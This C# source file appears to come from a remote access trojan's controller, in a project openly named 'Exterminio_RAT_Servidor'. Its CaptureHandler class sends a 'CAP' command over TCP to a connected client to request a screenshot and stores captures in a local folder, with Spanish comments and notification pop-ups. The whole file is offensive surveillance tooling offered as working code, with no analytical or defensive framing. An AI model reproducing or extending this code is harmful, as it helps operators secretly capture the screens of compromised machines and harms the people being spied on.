using System;
using System.IO;
using System.IO.Compression;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Exterminio_RAT_Servidor
{
    public class CaptureHandler
    {
        private readonly Form1 mainForm;
        private readonly string captureDirectory;

        public CaptureHandler(Form1 form)
        {
            mainForm = form;
            captureDirectory = Path.Combine(Application.StartupPath, "Captures");
            
            // Crear directorio de capturas si no existe
            if (!Directory.Exists(captureDirectory))
            {
                Directory.CreateDirectory(captureDirectory);
            }
        }

        public async Task HandleCaptureCommand(TcpClient client, string clientId)
        {
            try
            {
                Console.WriteLine($"Enviando comando CAP al cliente {clientId}");
                
                // Enviar comando CAP al cliente
                NetworkStream stream = client.GetStream();
                byte[] commandBytes = Encoding.UTF8.GetBytes("CAP");
                await stream.WriteAsync(commandBytes, 0, commandBytes.Length);
                
                Console.WriteLine($"Comando CAP enviado al cliente {clientId}");
                
                // Mostrar notificación
                mainForm.Invoke((MethodInvoker)delegate
                {
                    if (!mainForm.IsDisposed && !mainForm.Disposing)
                    {
                        mainForm.ShowNotification("Captura Solicitada", 
                            $"Solicitando captura de pantalla al cliente {clientId}", 
                            ToolTipIcon.Info);
                    }
                });
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error enviando comando CAP: {ex.Message}");
                mainForm.Invoke((MethodInvoker)delegate
                {
                    if (!mainForm.IsDisposed && !mainForm.Disposing)
                    {
                        mainForm.ShowNotification("Error de Captura", 
                            $"Error solicitando captura al cliente {clientId}: {ex.Message}", 
                            ToolTipIcon.Error);
                    }
                });
            }
        }


    }
}
